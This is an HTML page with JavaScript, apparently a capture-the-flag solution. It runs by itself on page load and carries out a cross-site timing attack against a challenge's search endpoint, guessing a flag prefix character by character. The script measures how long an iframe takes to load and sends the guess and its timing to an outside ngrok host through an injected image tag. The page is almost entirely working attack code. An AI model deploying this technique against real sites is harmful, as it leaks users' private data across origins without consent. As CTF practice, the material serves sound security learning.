
<!DOCTYPE html>
<html>
<body onload="cors()">
<center>  
	<h1>Nothing here bot</h1>
</div>
</body>
<script>
function cors() {
	var ig = "fb{cr055_s173_l3_________o";
 	var iframe = document.createElement('iframe');
	iframe.setAttribute('t1', (new Date()).getTime());
	iframe.setAttribute('src', "http://challenges.fbctf.com:8082/search?query="+ig);
	iframe.onload = function () {
    	var t2 = (new Date()).getTime() - parseInt(this.getAttribute('t1')) ;
    	 send(t2 , ig) ;
	}
	document.body.appendChild(iframe); 
}
function send(val,ig) {
	document.write('<img src="http://92232aa9.ngrok.io/attack.php?a='+ig+'&b='+val+'">')	
}
</script>
</html>
